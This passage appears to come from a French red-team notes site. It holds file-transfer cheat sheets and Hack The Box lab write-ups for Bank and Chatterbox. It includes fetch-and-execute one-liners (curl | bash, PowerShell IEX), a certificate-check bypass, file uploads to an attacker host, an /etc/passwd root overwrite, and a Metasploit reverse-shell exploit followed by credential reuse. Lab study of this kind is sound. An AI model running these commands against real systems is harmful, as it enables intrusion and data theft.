wget.js:\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n\nPuis:\n\ncscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre> <p>Windows, via cr\u00e9ation d'un fichier \"wget.vbs\" (VBScript):</p> <pre><code>Contenu wget.vbs\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n\nPuis:\n\ncscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Linux%20vers%20linux/","title":"Linux vers linux","text":"<p>R\u00e9ception de fichier en base64:</p> <pre><code>cat $fichier | base64 -w 0;echo\n</code></pre> <pre><code>echo -n '$base64' | base64 -d &gt; $fichier\n</code></pre> <p>T\u00e9l\u00e9charger un fichier et l'ex\u00e9cuter (fileless):</p> <pre><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n\nou \n\nwget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n</code></pre> <p>R\u00e9ception d'un fichier via SSH:</p> <pre><code>sudo systemctl start ssh\n</code></pre> <pre><code>scp $user@$monIp:$fichier .\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/","title":"Serveurs temporaires","text":"<p>Serveur web python3:</p> <pre><code>python3 -m http.server\n</code></pre> <p>Serveur web python2.7:</p> <pre><code>python2.7 -m SimpleHTTPServer\n</code></pre> <p>Serveur web PHP:</p> <pre><code>php -S 0.0.0.0:8000\n</code></pre> <p>Serveur web Ruby:</p> <pre><code>ruby -run -ehttpd . -p8000\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20depuis%20Windows/","title":"T\u00e9l\u00e9charger depuis Windows","text":"<p>Envoie de fichier en base64:</p> <pre><code>cat $fichier |base64 -w 0;echo\n</code></pre> <pre><code>[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\$fichier\", [Convert]::FromBase64String(\"$base64\"))\n</code></pre> <p>T\u00e9l\u00e9charger un fichier en powershell:</p> <pre><code>(New-Object Net.WebClient).DownloadFileAsync('$url','$nomFichier')\n</code></pre> <p>T\u00e9l\u00e9charger un fichier en m\u00e9moire et l'ex\u00e9cuter (fileless):</p> <pre><code>IEX (New-Object Net.WebClient).DownloadString('$Url_Script.ps1')\n\nou\n\n(New-Object Net.WebClient).DownloadString('$Url_Script.ps1') | IEX\n</code></pre> <p>T\u00e9l\u00e9charger un fichier via Invoke-WebRequest (ou un de ses Alias: wget, curl, iwr):</p> <pre><code>Invoke-WebRequest $url -OutFile $nomFichier\n</code></pre> <p>Bypasser un certificat untrusted:</p> <pre><code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre> <p>R\u00e9ception d'un fichier via cr\u00e9ation d'un partage SMB:</p> <pre><code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user t3st -password p4ssword\n</code></pre> <pre><code>net use n: \\\\$monip\\share /user:t3st p4ssword\n</code></pre> <p>R\u00e9ception d'un fichier via cr\u00e9ation d'un serveur FTP:</p> <pre><code>sudo pip3 install pyftpdlib\nsudo python3 -m pyftpdlib --port 21\n</code></pre> <pre><code>(New-Object Net.WebClient).DownloadFile('ftp://$monIp/file.txt', 'ftp-file.txt')\n\nOu, en cas de shell non-interractif:\n\necho open $monIp &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho GET file.txt &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre>"},{"location":"Red%20Team/6%20-%20Misc/Transfert%20de%20fichiers/Uploader%20depuis%20Windows/","title":"Uploader depuis Windows","text":"<p>Upload d'un fichier depuis windows en base64:</p> <pre><code>[Convert]::ToBase64String((Get-Content -path \"$fichier\" -Encoding byte))\n</code></pre> <pre><code>echo $base64 | base64 -d &gt; $fichier\n</code></pre> <p>Upload d'un fichier via cr\u00e9ation d'un serveur d'upload:</p> <pre><code>pip3 install uploadserver\npython3 -m uploadserver\n</code></pre> <pre><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nInvoke-FileUpload -Uri http://$monIp:8000/upload -File $fichier\n</code></pre> <p>Upload d'un fichier en base64 via netcat:</p> <pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path '$fichier' -Encoding Byte))\nInvoke-WebRequest -Uri http://$monIp:8000/ -Method POST -Body $b64\n</code></pre> <pre><code>nc -lvnp 8000\necho $base64 | base64 -d -w 0 &gt; $fichier\n</code></pre> <p>Upload d'un fichier via cr\u00e9ation d'un serveur FTP:</p> <pre><code>sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> <pre><code>(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$fichier')\n\nOu, en cas de shell non-interractif:\n\necho open $monIp &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho PUT $fichier &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre>"},{"location":"Writeup/HTB/Machines/Bank/","title":"Bank","text":"Room Bank Url https://app.hackthebox.com/machines/Bank Sujets Linux Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Easy"},{"location":"Writeup/HTB/Machines/Bank/#nmap","title":"Nmap","text":"<pre><code>PORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n ssh-hostkey: \n   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)\n ssh-dss AAAAB3NzaC1kc3MAAACBAMJ+YATka9wvs0FTz8iNWs6uCiLqSFhmBYoYAorFpozVGkCkU1aEJ7biybFTw/qzS9pbSsaYA+3LyUyvh3BSPGEt1BgGW/H29MuXjkznwVz60JqL4GqaJzYSL3smYYdr3KdJQI/QSvf34WU3pife6LRmJaVk+ETh3wPclyecNtedAAAAFQC1Zb2O2LzvAWf20FdsK8HRPlrx1wAAAIBIBAhLmVd3Tz+o+6Oz39g4Um1le8d3DETINWk3myRvPw8hcnRwAFe1+14h3RX4fr+LKXoR/tYrI138PJyiyl+YtQWhZnJ7j8lqnKRU2YibtnUc44kP9FhUqeAcBNjj4qwG9GyQSWm/Q5CbOokgaa6WfdcnwsUMim0h2Ad8YdU1kAAAAIBy3dOOD8jKHeBdE/oXGG0X9tKSFZv1gPr/kZ7NfqUF0kHU3oZTNK8/2qR0SNHgrZ2cLgKTIuneGS8lauXjC66NNMoUkJcMHpwRkYC0A86LDmhES6OuPsQwAjr1AtUZn97QjYu1d6WPfhTdsRYBuCotgKh2SBkzV1Bcz77Tnp56JA==\n   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc0rofjHtpSlqkDjjnkEiYcbUrMH0Q4a6PcxqsR3updDGBWu/RK7AGWRSjPn13uil/nl44XF/fkULy7FoXXskByLCHP8FS2gYJApQMvI9n81ERojEA0NIi6VZKP19bl1VFTk7Q5rEPIpab2xqYMBayb1ch7iP95n3iayvHEt/7cSTsddGWKeALi+rrujpnryNViiOIWpqDv+RWtbc2Wuc/FTeGSOt1LBTbtKcLwEehBG+Ym8o8iKTd+zfVudu7v1g3W2Aa3zLuTcePRKLUK3Q2D7k+5aJnWrekpiARQm3NmMkv1NuDLeW3amVBCv6DRJPBqEgSeGMGsnqkR8CKHO9/\n   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)\n ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH30xnPq1XEub/UFQ2KoHXh9LFKMNMkt60xYF3OrEp1Y5XQd0QyeLXwm6tIqWtb0rWda/ivDgmiB4GzCIMf/HQ=\n   256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)\n_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8MYjFyo+4OwYGTzeuyNd998y6cOx56mIuciim1cvKh\n53/tcp open  domain  syn-ack ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)\n dns-nsid: \n_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu\n80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))\n_http-title: Apache2 Ubuntu Default Page: It works\n_http-server-header: Apache/2.4.7 (Ubuntu)\n http-methods: \n Supported Methods: GET HEAD POST OPTIONS\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"Writeup/HTB/Machines/Bank/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>pak@laptop:~/T\u00e9l\u00e9chargements$ feroxbuster -u http://10.129.29.200\n\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.10.2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://10.129.29.200\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.2\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET       14l       74w     6216c http://10.129.29.200/icons/ubuntu-logo.png\n200      GET      378l      980w    11510c http://10.129.29.200/\n404      GET        9l       33w      290c http://10.129.29.200/Web%20References\n404      GET        9l       33w      285c http://10.129.29.200/Home%20Page\n404      GET        9l       33w      290c http://10.129.29.200/Press%20Releases\n404      GET        9l       33w      284c http://10.129.29.200/Site%20Map\n404      GET        9l       34w      292c http://10.129.29.200/Life%20Income%20Gift\n404      GET        9l       33w      286c http://10.129.29.200/New%20Folder\n404      GET        9l       33w      287c http://10.129.29.200/Site%20Assets\n[####################] - 2m     30005/30005   0s      found:9       errors:0      \n[####################] - 2m     30000/30000   306/s   http://10.129.29.200/\n</code></pre> <pre><code>pak@laptop:~/T\u00e9l\u00e9chargements$ dig axfr bank.htb @10.129.29.200 \n\n; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr bank.htb @10.129.29.200\n;; global options: +cmd\nbank.htb.       604800  IN  SOA bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800\nbank.htb.       604800  IN  NS  ns.bank.htb.\nbank.htb.       604800  IN  A   10.129.29.200\nns.bank.htb.        604800  IN  A   10.129.29.200\nwww.bank.htb.       604800  IN  CNAME   bank.htb.\nbank.htb.       604800  IN  SOA bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800\n;; Query time: 319 msec\n;; SERVER: 10.129.29.200#53(10.129.29.200) (TCP)\n;; WHEN: Tue Apr 02 13:23:23 CEST 2024\n;; XFR size: 6 records (messages 1, bytes 171)\n</code></pre> <p>Apr\u00e8s un fuzzing des r\u00e9pertoire, on trouve :</p> <pre><code>http://bank.htb/balance-transfer/?C=S;O=A\n</code></pre> <p>Dont le fichier :</p> <pre><code>http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc\n\n--ERR ENCRYPT FAILED\n+=================+\n| HTB Bank Report |\n+=================+\n\n===UserAccount===\nFull Name: Christos Christopoulos\nEmail: chris@bank.htb\nPassword: !##HTBB4nkP4ssw0rd!##\nCreditCards: 5\nTransactions: 39\nBalance: 8842803 .\n===UserAccount===\n</code></pre>"},{"location":"Writeup/HTB/Machines/Bank/#foothold","title":"Foothold","text":"<p>Sur la page de support il est possible d'uploader un fichier, et nous voyons ce message dans le code source :</p> <p></p> <p></p>"},{"location":"Writeup/HTB/Machines/Bank/#privesc","title":"Privesc","text":"<p>Apr\u00e8s un linpeas, on se rend compte que nous pouvons \u00e9crire sur /etc/passwd... La box est donc termin\u00e9e :</p> <pre><code>pak@Desktop:~/Downloads$ openssl passwd pakpak123\n$1$7cJ.UgUN$wmzg9LUwJJwxVh5Am4MR70\n</code></pre> <pre><code>root:$1$7cJ.UgUN$wmzg9LUwJJwxVh5Am4MR70:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsyslog:x:101:104::/home/syslog:/bin/false\nmessagebus:x:102:106::/var/run/dbus:/bin/false\nlandscape:x:103:109::/var/lib/landscape:/bin/false\nchris:x:1000:1000:chris,,,:/home/chris:/bin/bash\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nbind:x:105:112::/var/cache/bind:/bin/false\nmysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre> <pre><code>(remote) www-data@bank:/tmp$ su\nPassword: \nroot@bank:/tmp# cd /root\nroot@bank:~# ls\nroot.txt\n</code></pre>"},{"location":"Writeup/HTB/Machines/Chatterbox/","title":"Chatterbox","text":"Room Chatterbox Url https://app.hackthebox.com/machines/123 Sujets Windows Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Chatterbox/#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE     REASON  VERSION\n135/tcp   open  msrpc       syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn syn-ack Microsoft Windows netbios-ssn\n445/tcp   open  \ufffd\ufffd\ufffdd5V      syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n9255/tcp  open  http        syn-ack AChat chat system httpd\n|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE\n|_http-server-header: AChat\n|_http-title: Site doesn't have a title.\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n9256/tcp  open  achat       syn-ack AChat chat system\n49152/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49153/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49154/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49155/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49156/tcp open  msrpc       syn-ack Microsoft Windows RPC\n49157/tcp open  msrpc       syn-ack Microsoft Windows RPC\nService Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 38735/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 60790/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 64306/udp): CLEAN (Timeout)\n|   Check 4 (port 9559/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: Chatterbox\n|   NetBIOS computer name: CHATTERBOX\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2023-09-07T19:49:09-04:00\n| smb2-time: \n|   date: 2023-09-07T23:49:06\n|_  start_date: 2023-09-07T23:45:56\n|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n</code></pre>"},{"location":"Writeup/HTB/Machines/Chatterbox/#exploit","title":"Exploit","text":"<p>On voit un service \"AChat\" (inconnu au bataillon): \u00e7a a l'air de r\u00e9pondre \u00e0 du http, je tente d'aller dessus avec mon brave firefox mais... rien.</p> <p>Un searchsploit sur AChat montre un buffer overflow possible sur une des versions. Pourquoi pas ! Un module metasploit semble exister, mais il n'est pas tr\u00e8s coop\u00e9ratif \u00e0 premi\u00e8re vue:</p> <pre><code>[-] Exploit failed: windows/meterpreter/reverse_tcp: All encoders failed to encode.\n[*] Exploit completed, but no session was created.\n</code></pre> <p>Une petite recherche me permet de voir que le souci n'apparait plus en changeant le type de payload:</p> <pre><code>set payload windows/meterpreter/reverse_tcp_allports\n</code></pre> <p>Et effectivement j'obtiens bien une connexion mais... elle meurt quelques secondes apr\u00e8s. Tristesse.</p> <pre><code>msf6 exploit(windows/misc/achat_bof) &gt; exploit\n\n[*] Started reverse TCP handler on 10.10.16.13:1 \n[*] Sending stage (175686 bytes) to 10.10.10.74\n[*] Meterpreter session 2 opened (10.10.16.13:1 -&gt; 10.10.10.74:49159) at 2023-09-07 21:04:15 +0200\n\nmeterpreter &gt; shell\nProcess 2488 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;\n[*] 10.10.10.74 - Meterpreter session 2 closed.  Reason: Died\n</code></pre> <p>Je re-tente l'exploit, juste le temps de lancer une commande \"ps\":</p> <pre><code>meterpreter &gt; ps\n\nProcess List\n============\n\n PID   PPID  Name            Arch  Session  User               Path\n ---   ----  ----            ----  -------  ----               ----\n 0     0     [System Proces\n             s]\n 4     0     System\n 212   3860  CompatTelRunne\n             r.exe\n 232   4     smss.exe\n 288   576   rundll32.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\rundll32.ex\n                                                               e\n 312   304   csrss.exe\n 352   304   wininit.exe\n 364   344   csrss.exe\n 420   344   winlogon.exe\n 456   352   services.exe\n 464   352   lsass.exe\n 472   352   lsm.exe\n 576   456   svchost.exe\n 592   920   wuauclt.exe     x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\wuauclt.exe\n 640   456   vm3dservice.ex\n             e\n 664   456   svchost.exe\n 716   456   svchost.exe\n 792   456   svchost.exe\n 872   456   svchost.exe\n 920   456   svchost.exe\n 968   456   svchost.exe\n 984   456   svchost.exe\n 1076  288   dinotify.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\System32\\dinotify.ex\n                                                               e\n 1104  456   svchost.exe\n 1236  456   spoolsv.exe\n 1272  456   svchost.exe\n 1400  456   taskhost.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\taskhost.ex\n                                                               e\n 1424  456   svchost.exe\n 1504  456   sppsvc.exe\n 1548  792   dwm.exe         x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\Dwm.exe\n 1572  1504  explorer.exe    x86   1        CHATTERBOX\\Alfred  C:\\Windows\\Explorer.EXE\n 1696  1572  vm3dservice.ex  x86   1        CHATTERBOX\\Alfred  C:\\Windows\\System32\\vm3dservice\n             e                                                 .exe\n 1704  1572  vmtoolsd.exe    x86   1        CHATTERBOX\\Alfred  C:\\Program Files\\VMware\\VMware\n                                                               Tools\\vmtoolsd.exe\n 1824  456   VGAuthService.\n             exe\n 1852  456   vmtoolsd.exe\n 1872  312   conhost.exe\n 2100  456   dllhost.exe\n 2160  576   WmiPrvSE.exe\n 2344  456   msdtc.exe\n 2540  456   SearchIndexer.\n             exe\n 2752  3052  AChat.exe       x86   1        CHATTERBOX\\Alfred  c:\\Program Files\\AChat\\AChat.ex\n                                                               e\n 3164  456   svchost.exe\n 3188  920   taskeng.exe     x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\taskeng.exe\n 3316  576   WmiPrvSE.exe\n 3836  576   dllhost.exe     x86   1        CHATTERBOX\\Alfred  C:\\Windows\\system32\\DllHost.exe\n 3860  456   CompatTelRunne\n             r.exe\n</code></pre> <p>Impeccable. Je vois par exemple le PID 288, je tente donc de relancer l'exploit et de migrer tr\u00e8s vite vers ce PID pour voir si mon shell se stabilise:</p> <pre><code>meterpreter &gt; migrate 288\n[*] Migrating from 3816 to 288...\n[*] Migration completed successfully.\nmeterpreter &gt; \n</code></pre> <p>Ca fonctionne, mon shell semble \u00eatre stable. </p> <pre><code>C:\\Windows\\system32&gt;whoami /all\nwhoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name         SID                                          \n================= =============================================\nchatterbox\\alfred S-1-5-21-1218242403-4263168573-589647361-1000\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID          Attributes                                        \n====================================== ================ ============ ==================================================\nEveryone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nLOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State   \n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled \nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n</code></pre> <p>Un d\u00e9placement sur le desktop de l'utilisateur: le flag est l\u00e0, comme attendu.</p>"},{"location":"Writeup/HTB/Machines/Chatterbox/#devenons-root","title":"Devenons root","text":"<p>Et l\u00e0... J'ai pas trop d'id\u00e9es. Je fais un peu le tour du syst\u00e8me, je ne vois pas grand chose. Un petit WinPEAS ? Aller.</p> <p>Bingo.</p> <pre><code>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0379 Looking for AutoLogon credentials\n    Some AutoLogon credentials were found\n    DefaultUserName               :  Alfred\n    DefaultPassword               :  Welcome1!\n</code></pre> <p>Bon, c'est mon utilisateur actuel, certe, mais \u00e7a risque de me permettre de tenter quelques trucs sur le SMB qui semble ouvert.</p> <pre><code>\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Alfred -p 'Welcome1!'       \nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Alfred:Welcome1! \n\n\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!'\nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Administrator:Welcome1! (Pwn3d!)\n</code></pre> <p>AH ! D'accord. Bah je n'y croyais pas forc\u00e9ment, mais il s'agit de password-reuse. Je suis root.</p> <pre><code>\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'dir C:\\Users\\Administrator\\Desktop'\nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Administrator:Welcome1! (Pwn3d!)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Executed command \nSMB         10.10.10.74     445    CHATTERBOX       Volume in drive C has no label.\nSMB         10.10.10.74     445    CHATTERBOX       Volume Serial Number is 502F-F304\nSMB         10.10.10.74     445    CHATTERBOX       \nSMB         10.10.10.74     445    CHATTERBOX       Directory of C:\\Users\\Administrator\\Desktop\nSMB         10.10.10.74     445    CHATTERBOX       \nSMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    &lt;DIR&gt;          .\nSMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    &lt;DIR&gt;          ..\nSMB         10.10.10.74     445    CHATTERBOX       09/07/2023  08:25 PM                34 root.txt\nSMB         10.10.10.74     445    CHATTERBOX       1 File(s)             34 bytes\nSMB         10.10.10.74     445    CHATTERBOX       2 Dir(s)   3,311,423,488 bytes free\n\n\u250c\u2500\u2500(pak\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'type C:\\Users\\Administrator\\Desktop\\root.txt'\nSMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\\Administrator:Welcome1! (Pwn3d!)\nSMB         10.10.10.74     445    CHATTERBOX       [+] Executed command \nSMB         10.10.10.74     445    CHATTERBOX       ce4b046919fe296c########8be1\n</code></pre> <p>:).</p>"},{"location":"Writeup/HTB/Machines/Escape/","title":"Escape","text":"Room Escape Url https://app.hackthebox.com/machines/531 Sujets Windows/AD/ADCS Active/Retired lors de la r\u00e9solution Retired Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Escape/#nmap","title":"Nmap","text":"<pre><code>pak@kali:~$ nmap -A -p- 10.129.81.126 -Pn  \nStarting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 14:12 CEST\nNmap scan report for 10.129.81.126\nHost is up (0.013s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE 